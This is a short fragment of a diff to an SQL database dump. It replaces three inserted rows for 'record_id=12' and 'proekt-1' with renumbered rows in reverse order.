-(155, 'record_id=12', 'proekt-1', 1),
-(156, 'record_id=12', 'proekt-1', 3),
-(157, 'record_id=12', 'proekt-1', 4);
+(160, 'record_id=12', 'proekt-1', 4),
+(159, 'record_id=12', 'proekt-1', 3),
+(158, 'record_id=12', 'proekt-1', 1);
 
 -- --------------------------------------------------------
 
